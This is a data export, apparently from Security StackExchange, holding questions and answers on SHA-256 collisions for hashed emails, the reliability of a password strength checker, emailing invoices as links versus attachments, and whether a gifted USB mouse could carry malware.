<p>I agree with <a href=""https://security.stackexchange.com/users/54284/thoriumbr"">@ThoriumBR</a> and <a href=""https://security.stackexchange.com/users/53333/cbhacking"">@CBHacking</a> - you don't need to worry about this.  Your valuable time as a coder would be much better applied to other more productive things - even if it only takes you a few minutes to implement this check.</p>
","1"
"267332","267332","Are SHA-256 hashes of user emails guaranteed to be unique?","<p>I'm working on a website that will require users to insert a valid email address, which will work as their unique user id. This email will not be used for communicating with the user, it is only ever used to verify that a particular user id exists.</p>
<p>I've read a lot about storing emails to a database and about how they should be hashed to improve security and my plan is to use SHA-256 with pepper to store all emails. In pseudo code, something like: <code>sha256( &quot;example@email.com&quot;, &quot;peppermintTea&quot; ) =&gt; &quot;62d989abbca458c2616acddfbf45a364037a70ebd941568c9ee8f5d923e38c4f&quot;</code></p>
<p>While reading up on SHA-256 and hashing emails, I've run into several different posts discussing the possibility of hash collisions. Some posters go to ridiculous lengths of saying &quot;it's more probably to be hit by an asteroid twice than it is for two files to have the same hash&quot;, but what about email addresses? Email addresses can be relatively short and I haven't been able to find any answer on whether or not it is possible for two hashed emails to return the same hash?</p>
<p>For argument sake, if there would be 5 billion email addresses in the world, is there a non-zero chance that two of these emails would return the same hash? If there is, then how should I prepare for these possible collisions?</p>
","5","5","267423","<p>Hashes are not unique. This is easy to prove: a SHA256 hash is only 256 bits long, so if you hash all the possible inputs that are 264 bits long, some of them will have to have the same hash because there aren't enough possible hashes for them to all be different.</p>
<p>However, for all practical purposes they <strong>are unique</strong>. You can't hash all possible 264-bit inputs because it takes way too long. And we're not talking just &quot;it's unlikely&quot; - we're talking that with the fastest theoretically possible computer, you'd have to use up the entire energy of several billion stars and you still probably wouldn't find the same hash twice. The probability is <em>so dang low</em> that it may as well be impossible for all practical purposes. Believe me, if someone does manage to find a SHA256 hash collision, your website will be so far down the priority list of things they could attack.</p>
<p>If billions of stars isn't good enough for you (you need your site to remain secure even after humanity advances to a Kardashev type 3 civilization?), use SHA512 instead and you would need to use the entire energy of gazillions of universes.</p>
<p>But unfortunately the probability <em>isn't</em> zero which is why you get all these Internet arguments. It can't possibly be 0.00%, no matter how good your hash algorithm is, so how many zeroes do you have to have before the inevitable 1, before it's okay to pretend it's 0.00%?</p>
<hr />
<p>Now, what <strong>is</strong> practically possible is that someone finds a <em>bug</em> in SHA256 and they find a way to reverse it - or at least, to change the input without changing the hash. That's quite possible and it's happened to other hash functions before, including MD5 and SHA-1.</p>
<p>Still, what's the impact if that happens? Someone can sign up with an email and block another email from signing up? Then you change your hash algorithm to SHA-3. You keep the SHA-2 hashes from before that date, but you change the new ones to SHA-3. You hash the email with <em>both</em> SHA-2 and SHA-3 and if either one is found then the user can't sign up. No real problem.</p>
","4"
"267332","267332","Are SHA-256 hashes of user emails guaranteed to be unique?","<p>I'm working on a website that will require users to insert a valid email address, which will work as their unique user id. This email will not be used for communicating with the user, it is only ever used to verify that a particular user id exists.</p>
<p>I've read a lot about storing emails to a database and about how they should be hashed to improve security and my plan is to use SHA-256 with pepper to store all emails. In pseudo code, something like: <code>sha256( &quot;example@email.com&quot;, &quot;peppermintTea&quot; ) =&gt; &quot;62d989abbca458c2616acddfbf45a364037a70ebd941568c9ee8f5d923e38c4f&quot;</code></p>
<p>While reading up on SHA-256 and hashing emails, I've run into several different posts discussing the possibility of hash collisions. Some posters go to ridiculous lengths of saying &quot;it's more probably to be hit by an asteroid twice than it is for two files to have the same hash&quot;, but what about email addresses? Email addresses can be relatively short and I haven't been able to find any answer on whether or not it is possible for two hashed emails to return the same hash?</p>
<p>For argument sake, if there would be 5 billion email addresses in the world, is there a non-zero chance that two of these emails would return the same hash? If there is, then how should I prepare for these possible collisions?</p>
","5","5","267458","<p>Let's look at it this way: for a hash of that length, if anyone <em>ever</em> were able to find two different messages that came to the same hash, it would be a probable indication the hash algorithm is broken, because that would be a <em>much</em> more likely explanation than stumbling upon a collision by accident or by brute force.</p>
<p>You can and should treat all such hashes as if they are unique.</p>
<p>Of course, collisions are <em>possible</em>.  It's easy to say through reasoning that two messages may generate the same hash - this is necessarily the case.  But it is necessarily practically <em>impossible</em> to show it by producing two such messages.  We are in the domain of things where this would never happen in practice even if all the computers in the world tried doing this for a long time - unless a flaw in the hashing algorithm is discovered.</p>
<p>In terms of &quot;how unique&quot; you need before you can stop worrying about collisions, consider that UUIDv4 identifiers, which have only around 122 bits of randomness, are generally considered to be &quot;globally&quot; unique - enough not to have to code around the possibility of collisions, in most applications.  And here we are talking about not 122 but 256 bits.  If 122 bits can uniquely represent all atoms in the human body, 256 bits can uniquely represent all atoms in the galaxy.</p>
","2"
"267332","267332","Are SHA-256 hashes of user emails guaranteed to be unique?","<p>I'm working on a website that will require users to insert a valid email address, which will work as their unique user id. This email will not be used for communicating with the user, it is only ever used to verify that a particular user id exists.</p>
<p>I've read a lot about storing emails to a database and about how they should be hashed to improve security and my plan is to use SHA-256 with pepper to store all emails. In pseudo code, something like: <code>sha256( &quot;example@email.com&quot;, &quot;peppermintTea&quot; ) =&gt; &quot;62d989abbca458c2616acddfbf45a364037a70ebd941568c9ee8f5d923e38c4f&quot;</code></p>
<p>While reading up on SHA-256 and hashing emails, I've run into several different posts discussing the possibility of hash collisions. Some posters go to ridiculous lengths of saying &quot;it's more probably to be hit by an asteroid twice than it is for two files to have the same hash&quot;, but what about email addresses? Email addresses can be relatively short and I haven't been able to find any answer on whether or not it is possible for two hashed emails to return the same hash?</p>
<p>For argument sake, if there would be 5 billion email addresses in the world, is there a non-zero chance that two of these emails would return the same hash? If there is, then how should I prepare for these possible collisions?</p>
","5","5","267484","<p>Collisions on SHA256 are statistically improbable. The chances of two emails colliding are so small that you can safely ignore collisions. If you don't want to ignore, you can just use two different hashes at the same time: SHA256 and MD5, for example. The situation is &quot;turtles all way down&quot;: chances of two emails colliding both on SHA256 and MD5 are small, but not zero. So you use another hash: SHA3. And the chances of colliding SHA256, MD5 and SHA3 are even smaller, but not zero...</p>
<p>Don't overdo the collision processing, you may end up spending a lot of time on a piece of code that is almost certain to never ever be used at all. This should be on the bottom of your TODO list, and you should spend little time on it.</p>
<p>Spend more time securing your application against real world issues, like Cross Site Scripting, SQL Injection, Authentication Bypass, things like that.  SHA256 collision prevention on email is like protecting your basement against a meteor hit: it will cost you time and money, the probability is too small, and you will divert resources that could be used protecting it against theft, flood, fire, things that really happen.</p>
","3"
"267141","267141","Can 777-characters long passphrase be considered too short?","<p>Is <a href=""https://rumkin.com/tools/password/"" rel=""nofollow noreferrer"">Rumkin.com's password tool</a> a reliable tool for password strength checking?</p>
<p>I am asking because:</p>
<ol>
<li><p>I am getting confusing suggestions:</p>
<p><a href=""https://i.stack.imgur.com/xvprb.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/xvprb.png"" alt=""password is very strong; suggest making the passphrase longer"" /></a>
(the password in this example is 777 characters long)</p>
</li>
<li><p>D. W.'s <a href=""https://security.stackexchange.com/questions/6095/xkcd-936-short-complex-password-or-long-dictionary-passphrase/6096#comment10210_6103"">comment</a> to Jeff Atwood's <a href=""/a/6103/11996"">answer</a> claims that <em>Rumpkin's estimates are apparently bogus</em>.</p>
</li>
<li><p>Adam Katz's <a href=""/a/267084/11996"">answer</a> to my <a href=""/q/267063/11996"">other question</a> claims that <em>password complexity detection tools are all wrong</em>. So that would include Rumpkin's, try zxcvbn (that I've been using so far) and many / all others.</p>
</li>
</ol>
<p>Please, note that this is not a broad question on whether all password strength checkers are unreliable. This has been addressed many times. But rather specifically about <a href=""https://rumkin.com/tools/password/"" rel=""nofollow noreferrer"">Rumkin.com's password tool</a>. I want to learn whether this tool's suggestion system is flawed or if (in any scenario) a 777-character password may be considered not long enough (and therefore whether any system can or rather <em>should</em> suggest making it even longer)?</p>
","16","4","267142","<p>Looking at the code of the site (which is not included in the linked github) it shows that the suggestion of making the passphrase longer is simply displayed always. From password-module.js (slightly beautified):</p>
<pre><code>{
    key: &quot;viewSuggestions&quot;,
    value: function() {
        var t = [m(&quot;li&quot;, &quot;Make the passphrase longer.&quot;)],
            r = this.strengthScore.charsets;
        return r.lower     || t.push(m(&quot;li&quot;, &quot;Add lowercase letters.&quot;)),
             r.upper       || t.push(m(&quot;li&quot;, &quot;Add uppercase letters.&quot;)), 
             r.number      || t.push(m(&quot;li&quot;, &quot;Add numbers.&quot;)), 
             r.punctuation || t.push(m(&quot;li&quot;, &quot;Add punctuation.&quot;)), 
             r.symbol      || t.push(m(&quot;li&quot;, &quot;Add symbols, such as ones used for math.&quot;)), 
             t
    }
}
</code></pre>
<p>As can be seen - &quot;Make the passphrase longer.&quot; is always included and all the others depending on the input.</p>
<blockquote>
<p>Is Rumkin.com's password tool a reliable tool for password strength checking?</p>
</blockquote>
<p>Your main point seem to be the strange suggestion that even a very long password should be made longer. As shown, this is not a suggestion you can rely on. It is not an actual harmful suggestion though. But after some sufficient complexity and length is reached, this recommendation adds no real value and instead causes confusion.</p>
","43"
"267141","267141","Can 777-characters long passphrase be considered too short?","<p>Is <a href=""https://rumkin.com/tools/password/"" rel=""nofollow noreferrer"">Rumkin.com's password tool</a> a reliable tool for password strength checking?</p>
<p>I am asking because:</p>
<ol>
<li><p>I am getting confusing suggestions:</p>
<p><a href=""https://i.stack.imgur.com/xvprb.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/xvprb.png"" alt=""password is very strong; suggest making the passphrase longer"" /></a>
(the password in this example is 777 characters long)</p>
</li>
<li><p>D. W.'s <a href=""https://security.stackexchange.com/questions/6095/xkcd-936-short-complex-password-or-long-dictionary-passphrase/6096#comment10210_6103"">comment</a> to Jeff Atwood's <a href=""/a/6103/11996"">answer</a> claims that <em>Rumpkin's estimates are apparently bogus</em>.</p>
</li>
<li><p>Adam Katz's <a href=""/a/267084/11996"">answer</a> to my <a href=""/q/267063/11996"">other question</a> claims that <em>password complexity detection tools are all wrong</em>. So that would include Rumpkin's, try zxcvbn (that I've been using so far) and many / all others.</p>
</li>
</ol>
<p>Please, note that this is not a broad question on whether all password strength checkers are unreliable. This has been addressed many times. But rather specifically about <a href=""https://rumkin.com/tools/password/"" rel=""nofollow noreferrer"">Rumkin.com's password tool</a>. I want to learn whether this tool's suggestion system is flawed or if (in any scenario) a 777-character password may be considered not long enough (and therefore whether any system can or rather <em>should</em> suggest making it even longer)?</p>
","16","4","267143","<p>If it's claiming that the way to improve the strength of a 777 character passphrase is to &quot;make it longer&quot;, then it's nonsense.</p>
<p>A 777 character passphrase isn't necessarily very secure (for example, if it's just the letter <code>a</code> 777 times or if it's in a public dictionary or wordlist) - but in both of those cases the recommendation of &quot;make it longer&quot; is wrong.</p>
<p>All of these &quot;entropy&quot; calculators are pretty dodgy, because they tend to make bad assumptions about how attackers are actually cracking passwords. For example, the one you linked says that &quot;password&quot; provides 35 bits of entropy, when it's one of the most commonly used password out there and right at the start of pretty much every wordlist.</p>
","10"
"267141","267141","Can 777-characters long passphrase be considered too short?","<p>Is <a href=""https://rumkin.com/tools/password/"" rel=""nofollow noreferrer"">Rumkin.com's password tool</a> a reliable tool for password strength checking?</p>
<p>I am asking because:</p>
<ol>
<li><p>I am getting confusing suggestions:</p>
<p><a href=""https://i.stack.imgur.com/xvprb.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/xvprb.png"" alt=""password is very strong; suggest making the passphrase longer"" /></a>
(the password in this example is 777 characters long)</p>
</li>
<li><p>D. W.'s <a href=""https://security.stackexchange.com/questions/6095/xkcd-936-short-complex-password-or-long-dictionary-passphrase/6096#comment10210_6103"">comment</a> to Jeff Atwood's <a href=""/a/6103/11996"">answer</a> claims that <em>Rumpkin's estimates are apparently bogus</em>.</p>
</li>
<li><p>Adam Katz's <a href=""/a/267084/11996"">answer</a> to my <a href=""/q/267063/11996"">other question</a> claims that <em>password complexity detection tools are all wrong</em>. So that would include Rumpkin's, try zxcvbn (that I've been using so far) and many / all others.</p>
</li>
</ol>
<p>Please, note that this is not a broad question on whether all password strength checkers are unreliable. This has been addressed many times. But rather specifically about <a href=""https://rumkin.com/tools/password/"" rel=""nofollow noreferrer"">Rumkin.com's password tool</a>. I want to learn whether this tool's suggestion system is flawed or if (in any scenario) a 777-character password may be considered not long enough (and therefore whether any system can or rather <em>should</em> suggest making it even longer)?</p>
","16","4","267151","<p>Your question looks like XY problem. Why do you use this tool at all?</p>
<ol>
<li><p>High entropy of passwords is very important only if no &quot;resource hungry&quot; password hashing is used. For instance, if you use Argon2 in such way that hashing takes 1 second, then one CPU/GPU core can try only 86 400 (60 x 60 x 24) passwords per day or 31 536 000 passwords in a year. A million of such cores can brute-force 31 536 000 000 000 passwords in a year, means a 45 bit password, which approximately corresponds to a random password of length 10, consisting of lower case English letters. Rental of 1 000 000 cores for one year is very expensive. Means, for users with &quot;cheap&quot; secrets even a 10 letter password can be secure in a system with such hashing.</p>
</li>
<li><p>rumkin.com uses pretty old assumption about login security. Many web sites and applications lock users for some time (minutes, hours) after a few failed login attempts. That's why even short simple passwords may be sufficient to prevent brute-forcing. Many web sites and applications use also 2FA which makes logins despite short simple passwords even more secure. That's why forcing users to use longer and more complex passwords does not necessarily increases security essentially.</p>
</li>
</ol>
<p>In case you need password for some application that uses no &quot;resource hungry&quot; password hashing: rumkin.com does not take into account the generator used to generate passwords for particular user. For the password &quot;aabbbababa&quot; it shows 46 bits entropy. But if we know that the generator uses just letters &quot;a&quot; and &quot;b&quot; to generate any password, then the entropy is just 10 bits.</p>
<p>Besides, talking about a password as &quot;too short&quot; or &quot;long enough&quot; makes not much sense. The most important question is, what entropy the password has. Depending on generator used, a shorter password can have much more entropy than a longer one. E.g. a password of length 3 created from randomly selected  English letters has higher entropy than a password of length 10 created from randomly selected letters &quot;a&quot; and &quot;b&quot;.</p>
","10"
"267141","267141","Can 777-characters long passphrase be considered too short?","<p>Is <a href=""https://rumkin.com/tools/password/"" rel=""nofollow noreferrer"">Rumkin.com's password tool</a> a reliable tool for password strength checking?</p>
<p>I am asking because:</p>
<ol>
<li><p>I am getting confusing suggestions:</p>
<p><a href=""https://i.stack.imgur.com/xvprb.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/xvprb.png"" alt=""password is very strong; suggest making the passphrase longer"" /></a>
(the password in this example is 777 characters long)</p>
</li>
<li><p>D. W.'s <a href=""https://security.stackexchange.com/questions/6095/xkcd-936-short-complex-password-or-long-dictionary-passphrase/6096#comment10210_6103"">comment</a> to Jeff Atwood's <a href=""/a/6103/11996"">answer</a> claims that <em>Rumpkin's estimates are apparently bogus</em>.</p>
</li>
<li><p>Adam Katz's <a href=""/a/267084/11996"">answer</a> to my <a href=""/q/267063/11996"">other question</a> claims that <em>password complexity detection tools are all wrong</em>. So that would include Rumpkin's, try zxcvbn (that I've been using so far) and many / all others.</p>
</li>
</ol>
<p>Please, note that this is not a broad question on whether all password strength checkers are unreliable. This has been addressed many times. But rather specifically about <a href=""https://rumkin.com/tools/password/"" rel=""nofollow noreferrer"">Rumkin.com's password tool</a>. I want to learn whether this tool's suggestion system is flawed or if (in any scenario) a 777-character password may be considered not long enough (and therefore whether any system can or rather <em>should</em> suggest making it even longer)?</p>
","16","4","267152","<p><strong>Yes</strong>, there are situations where a 777-character password might be considered too short<sup>*</sup>. This would be the case if the password had a very low entropy. Entropy is a measure of how much information is contained in a sequence of symbols. While a completely uniform random 777-character password would be unbreakable, you could easily have an insecure password if it is low-entropy.</p>
<p>What is important is not password length on its own, but password entropy. Although increasing the length often increases entropy, the solution is not necessarily to keep increasing length. There are two relevant types of entropy here: Shannon entropy and min-entropy. Shannon entropy is the amount of information required to describe a sequence. However, if you want to measure how unpredictable a sequence is, you use min-entropy. According to <a href=""https://crypto.stackexchange.com/a/63797/54184"">an answer on Cryptography</a>:</p>
<blockquote>
<p>Say you have an algorithm which produces 8 digit numeric password. If the number 00000000 occurs 50% of the time, and the remaining 10<sup>8</sup>-1 passwords occur with equal probability, then the Shannon entropy would be about 14.3 bits, but the min-entropy is precisely 1, which is -log<sub>2</sub>(0.5).</p>
</blockquote>
<p>So you can absolutely have a long password that has many characters but is still insecure. While increasing the length may improve security, if your generation process cannot even generate a secure password that is hundreds of characters long, you need a better generation process.</p>
<p><sub>* It would actually be too <em>weak</em>, not necessarily too <em>short</em>. A 32 character password is much shorter, but if it is random and has a high entropy, it would be much, much stronger than a 777-character password with low entropy.</sub></p>
","3"
"267094","267094","Email with an attached file vs. email with a link to a file","<p>We have a software that sends out invoices by email. As the invoices contain the names of the clients and their addresses we consider the invoice to be sensitive to some degree.</p>
<p>Rather than sending out the actual file we provide the clients with a link so they can download the invoice from a website. The filename is made up of a GUID so that is reasonably hard to simply guess a valid/actual url/filename.</p>
<p>The idea behind this approach is that</p>
<ul>
<li>we cannot expect our clients to be able to use encrypted emails therefor regular unencrypted emails have to be used</li>
<li>the attached file is way easier to manipulate or replace in an unencrypted email than it is on the webserver</li>
<li>obviously the link could also be manipulated however we think this would be easier to notice</li>
<li>the GUID-filename provides some degree of security against simply guessing a valid filename (an additional password is considered to be too complicated by some of our clients)</li>
<li>we reduce the size of the email and therefore the size of the mailboxes of our clients</li>
</ul>
<p>Therefor we think it is a safer and better approach to email the link rather than the actual file.</p>
<p>We have some clients that consider this approach to be worse than attaching the file to the email. Besides convenience they reason that the files are now on the public internet and can be accessed by anyone. Which is technically true, however you would have to have the correct GUID to download such a file and we consider the chance of guessing a valid GUID to be rather slim.</p>
<p>Is there anything fundamentally wrong with our reasoning? Would attaching the file directly to the email in fact be safer?</p>
","2","4","267095","<p>I can see good points on both ways.</p>
<p>If the link is not password protected, the client have a point. It's practically impossible to guess the GUID, but bookmarks can leak, user can paste the link on the wrong window, or send to the wrong person. It could happen to the attached file too, but it's harder to mis-attach a file than to paste a link. You could solve that by registering an account for every client and asking for the password before giving the file.</p>
<p>On the other hand, having the link allows you to edit the contents of the file after the email has been sent. If something was wrong on the original file, you don't need to send another email with the new version, you just edit the file server-side and tell the client to re-download the file if needed.</p>
<p>Having the link means your service is really are the one with the data file, but attaching a file on the email don't prove that with the same certainty. DKIM, SPF and DMARC are useful to prevent email spoofing, but misconfigurations happen all the time. It's easier to spoof email from a misconfigured server than to break into a webserver, change a file and send an email with a poisoned link to its customers.</p>
","0"
"267094","267094","Email with an attached file vs. email with a link to a file","<p>We have a software that sends out invoices by email. As the invoices contain the names of the clients and their addresses we consider the invoice to be sensitive to some degree.</p>
<p>Rather than sending out the actual file we provide the clients with a link so they can download the invoice from a website. The filename is made up of a GUID so that is reasonably hard to simply guess a valid/actual url/filename.</p>
<p>The idea behind this approach is that</p>
<ul>
<li>we cannot expect our clients to be able to use encrypted emails therefor regular unencrypted emails have to be used</li>
<li>the attached file is way easier to manipulate or replace in an unencrypted email than it is on the webserver</li>
<li>obviously the link could also be manipulated however we think this would be easier to notice</li>
<li>the GUID-filename provides some degree of security against simply guessing a valid filename (an additional password is considered to be too complicated by some of our clients)</li>
<li>we reduce the size of the email and therefore the size of the mailboxes of our clients</li>
</ul>
<p>Therefor we think it is a safer and better approach to email the link rather than the actual file.</p>
<p>We have some clients that consider this approach to be worse than attaching the file to the email. Besides convenience they reason that the files are now on the public internet and can be accessed by anyone. Which is technically true, however you would have to have the correct GUID to download such a file and we consider the chance of guessing a valid GUID to be rather slim.</p>
<p>Is there anything fundamentally wrong with our reasoning? Would attaching the file directly to the email in fact be safer?</p>
","2","4","267098","<blockquote>
<p>we cannot expect our clients to be able to use encrypted emails therefor regular unencrypted emails have to be used</p>
</blockquote>
<p>Sadly true.</p>
<p>Moreover, the recipient server might not speak STARTTLS, and the connection may fall back to plaintext over the wire. (I expect your mail server to at least <em>try</em> to use STARTTLS always, bonus points for SMTP STS support)</p>
<blockquote>
<p>the attached file is way easier to manipulate or replace in an unencrypted email than it is on the webserver</p>
</blockquote>
<p>It depends on the type of risks you face. A file on the webserver could easily be manipulated <em>by you</em>, or if your webserver was somehow compromised.</p>
<p>A week after sending it you might change the invoice doubling the amount. If the invoice was in an attachment you would not need to do anything.</p>
<blockquote>
<pre><code>we reduce the size of the email and therefore the size of the mailboxes of our clients
</code></pre>
</blockquote>
<p>I find this is an important point for mails with large attachments and accounts nearly their quota. On the other hand, the attachment is simpler for archiving, as that allows to simply keep the emails (maybe automatically filtered into a folder), whereas the link requires <em>someone</em> to download it (autodownloading scripts are probably magic for most of your clients accountants). And some Cloud email solutions offer infinite mailbox storage, so while for some clients it's important, it will be a non-issue for others.</p>
<blockquote>
<p>obviously the link could also be manipulated however we think this would be easier to notice</p>
</blockquote>
<p>The average client would probably not notice that the link goes now to a completely different domain.</p>
<blockquote>
<p>the GUID-filename provides some degree of security against simply guessing a valid filename</p>
</blockquote>
<p>I expect you mean a random GUID (type 4). Yes, an url with enough entropy should be 'good enough' if handled properly. However, the secrecy of the file is as good as the security of the url.</p>
<p>It is probably easier to &quot;leak&quot; the url than the file. For example, an email filtering or antivirus solution might share the url as &quot;bad&quot;. The user itself could scan the url in VirusTotal (that will then happily download the &quot;public&quot; file).
Some users will nevertheless also share the attachments, though.</p>
<p>It would be much preferable that the files are encrypted. As they are invoices, they could be password-protected pdf, so the clients wouldn't even need to use a different program to open them. Although if there's an expectation that the clients will want to store the invoice without password protection, I would use a password protected zip file (using the modern AES encryption, of course, not the unsafe classic one).</p>
<p>Even if you include the password in the email along the url (which will still make some people claim is not secure, as someone that stole/copied that email would have <em>both</em> the url and the password at their disposal), that would be safer [than not having a password at all], as an inadvertently leak of the url would lead to a file that is still password protected.</p>
<p>Moreover, the storing the invoices encrypted also protect you somewhat against potential mistakes from your part (e.g. your random GUIDs turn out not to be that random, and someone downloads all the files). Particularly, when you use a different random password on each email and don't store it, so even you couldn't reveal its contents (OTOH if in the same system you were storing a db column with &quot;the&quot; pdf password for each customer, an attacker might steal everything).</p>
<p>In general, in my opinion adding a password to the file seems a measure adding interesting benefits while requiring low skills from the receiver. But, this is a feature you are rejecting:</p>
<blockquote>
<p>(an additional password is considered to be too complicated by some of our clients)</p>
</blockquote>
<p>and this reveals your actual problem. You are trying a one size fits all approach, but some of your clients consider attachments preferable than links (while others will consider the opposite), some demand a &quot;more secure&quot; approach and others are unable to open a password-protected file.</p>
<p><strong>I think you should make it configurable.</strong></p>
<p>Use a reasonable default, with password protected files (either as an attachment or as links, allowing them to change that), but let the user &quot;dumb it down&quot; by actually disabling the file encryption, and also provide a PGP key to which you would encrypt their email (and/or linked file).</p>
<p>That later option, while being the most secure one, will be a niche one with only a tiny fraction of your clients actually using it, even with a fairly technical user base. So the actual value of that option is probably going to be the <em>availability</em> of it more than the users of it: that you can offer your clients to use a much more secure way for sending them the invoice, if so they wish, even though they are most likely to decline.</p>
","0"
"267094","267094","Email with an attached file vs. email with a link to a file","<p>We have a software that sends out invoices by email. As the invoices contain the names of the clients and their addresses we consider the invoice to be sensitive to some degree.</p>
<p>Rather than sending out the actual file we provide the clients with a link so they can download the invoice from a website. The filename is made up of a GUID so that is reasonably hard to simply guess a valid/actual url/filename.</p>
<p>The idea behind this approach is that</p>
<ul>
<li>we cannot expect our clients to be able to use encrypted emails therefor regular unencrypted emails have to be used</li>
<li>the attached file is way easier to manipulate or replace in an unencrypted email than it is on the webserver</li>
<li>obviously the link could also be manipulated however we think this would be easier to notice</li>
<li>the GUID-filename provides some degree of security against simply guessing a valid filename (an additional password is considered to be too complicated by some of our clients)</li>
<li>we reduce the size of the email and therefore the size of the mailboxes of our clients</li>
</ul>
<p>Therefor we think it is a safer and better approach to email the link rather than the actual file.</p>
<p>We have some clients that consider this approach to be worse than attaching the file to the email. Besides convenience they reason that the files are now on the public internet and can be accessed by anyone. Which is technically true, however you would have to have the correct GUID to download such a file and we consider the chance of guessing a valid GUID to be rather slim.</p>
<p>Is there anything fundamentally wrong with our reasoning? Would attaching the file directly to the email in fact be safer?</p>
","2","4","267100","<p>The obvious downside in sending a URL link in the email is that you <em>train</em> your clients to follow links. This is bad from a social engineering point of view e.g. an attacker sends an email to one of your clients (that looks like it came from you) which provides a link to malware - most clients that are not security aware will follow the link and will be infected. However, if your clients are not security aware then, in my opinion, you are the least of their problems.</p>
<p>Aside from that, the way you will deliver the invoices should be the result of <em>legal constraints</em> and <em>technical preference</em>; legal constraints is about what laws do you have to comply with. Technical preference is which way is easier for you to maintain.</p>
<p>If you are in a jurisdiction where there's a legal requirement to protect the data, then sending invoices in the clear is not the way to go - and you have the arguments to support that. Of course, this depends on the data that the invoices include - not all data require protection by law.</p>
<p>On the other hand, your customers that feel uncomfortable with just the link may not realize that unprotected emails are exposed to the public too - but they do have a point in that sniffing an email and accessing a public link introduce completely different attack surfaces (with the public link being worse). As such, you should probably address their concerns by adding more protection measures (in your case, UUIDs being hard to guess is a single point of failure).</p>
<p>A simple solution would be that the URL link should be TLS protected (i.e. use the <code>https</code> scheme), and require clients to provide a username (client id) and password in order to access the invoice. Again, for the clients that don't want any of this, the legal constraints may work in your favour.</p>
","0"
"267094","267094","Email with an attached file vs. email with a link to a file","<p>We have a software that sends out invoices by email. As the invoices contain the names of the clients and their addresses we consider the invoice to be sensitive to some degree.</p>
<p>Rather than sending out the actual file we provide the clients with a link so they can download the invoice from a website. The filename is made up of a GUID so that is reasonably hard to simply guess a valid/actual url/filename.</p>
<p>The idea behind this approach is that</p>
<ul>
<li>we cannot expect our clients to be able to use encrypted emails therefor regular unencrypted emails have to be used</li>
<li>the attached file is way easier to manipulate or replace in an unencrypted email than it is on the webserver</li>
<li>obviously the link could also be manipulated however we think this would be easier to notice</li>
<li>the GUID-filename provides some degree of security against simply guessing a valid filename (an additional password is considered to be too complicated by some of our clients)</li>
<li>we reduce the size of the email and therefore the size of the mailboxes of our clients</li>
</ul>
<p>Therefor we think it is a safer and better approach to email the link rather than the actual file.</p>
<p>We have some clients that consider this approach to be worse than attaching the file to the email. Besides convenience they reason that the files are now on the public internet and can be accessed by anyone. Which is technically true, however you would have to have the correct GUID to download such a file and we consider the chance of guessing a valid GUID to be rather slim.</p>
<p>Is there anything fundamentally wrong with our reasoning? Would attaching the file directly to the email in fact be safer?</p>
","2","4","267104","<p>The email can be forwarded to anyone. Thus anyone can get access to it.</p>
<p>Better would be to add authentication and set access for specific users only. Then no matter to whom the email will be forwarded, you will have full control on who can access the link. Such approach is not new. It is widely used, in particular in MS Office 365 and in Google Docs.</p>
","0"
"267082","267082","Can the microsoft basic optical mouse be modified to contain spyware or a keylogger if the attacker had physical access to the mouse?","<p>I was given a mouse by someone who now i realized would want to hack me. It is the Microsoft basic optical mouse v2.0. Can this mouse be modified to inject spyware and malware onto my laptop?</p>
","0","3","267083","<p>The USB protocol allows to emulate <a href=""https://en.wikipedia.org/wiki/USB_mass_storage_device_class"" rel=""nofollow noreferrer"">mass storage</a> which you then need to run from <em>manually</em> in order to get hacked, so it's unlikely you could have missed it.</p>
<p>But even without a built-in ROM this mouse could possibly send all your mouse actions via radio channels which is enough to infer a lot of information about you.</p>
<p>Another avenue is a vulnerable USB stack in your operating system but if you keep your software up to date it's highly unlikely you could have been hacked this way.</p>
<p>AFAIK USB4/Thunderbolt is a whole different affair as it can function as a PCI-E device with full <a href=""https://lwn.net/Articles/782381/"" rel=""nofollow noreferrer"">DMA</a> control over your system (meaning full read access to your RAM without your OS knowing anything about that) but USB4/Thunderbolt devices are still relatively rare and Intel claims modern operating systems have safeguards against this.</p>
","0"
"267082","267082","Can the microsoft basic optical mouse be modified to contain spyware or a keylogger if the attacker had physical access to the mouse?","<p>I was given a mouse by someone who now i realized would want to hack me. It is the Microsoft basic optical mouse v2.0. Can this mouse be modified to inject spyware and malware onto my laptop?</p>
","0","3","267085","<p><strong>Yes, it is possible!</strong></p>
<p>A full up custom device that looks like a <em>Basic Optical Mouse</em> would require a fair amount of technical resources and money.</p>
<p>A more <em>Do It Yourself</em> approach might use something like <a href=""https://shop.hak5.org/collections/mischief-gadgets/products/omg-adapter"" rel=""nofollow noreferrer"">The O.MG Adapter</a> either embedded in the mouse, if there is room, or permanently attached in-line on the cable. It runs around $200 and still requires some significant technical expertise. Only you can decide how likely that is in your circumstances.</p>
","0"
"267082","267082","Can the microsoft basic optical mouse be modified to contain spyware or a keylogger if the attacker had physical access to the mouse?","<p>I was given a mouse by someone who now i realized would want to hack me. It is the Microsoft basic optical mouse v2.0. Can this mouse be modified to inject spyware and malware onto my laptop?</p>
","0","3","267101","<blockquote>
<p>Can this mouse be modified to inject spyware and malware onto my laptop?</p>
</blockquote>
<p>In principle, yes, USB can be used to <a href=""https://en.wikipedia.org/wiki/BadUSB"" rel=""nofollow noreferrer"">infect</a> your computer with malware. See for example <a href=""https://shop.hak5.org/products/usb-rubber-ducky"" rel=""nofollow noreferrer"">rubber ducky</a>, <a href=""https://en.wikipedia.org/wiki/Juice_jacking"" rel=""nofollow noreferrer"">juice jacking</a> and <a href=""https://hackerwarehouse.com/product/usb-ninja-cable/"" rel=""nofollow noreferrer"">ninja cable</a> (as mentioned in <a href=""https://security.stackexchange.com/users/125626/kate"">Kate</a>'s comment).</p>
<p>If I were you, I wouldn't expose my computer to any risk by using a mouse given to me by a person that wants to harm me. I would ditch the mouse and buy a new one, just to be on the safe side.</p>
","0"
"267063","267063","Why removing just one letter form passwords makes it 20x easier to break according to zxcvbn test","<p>Since I am a decent fan of the <a href=""https://xkcd.com/936/"" rel=""nofollow noreferrer"">XKCD no 936</a> (or actually conclusions and implications it brings), I wanted to test (using <em><a href=""https://lowe.github.io/tryzxcvbn/"" rel=""nofollow noreferrer"">try zxcvbn</a></em>) the complexity and the possiblity of breaking a password like the following one:</p>
<blockquote>
<p>My password for Facebook</p>
</blockquote>
<p>Written in my own native language (Polish), that is:</p>
<blockquote>
<p>Moje hasło do Facebooka</p>
</blockquote>
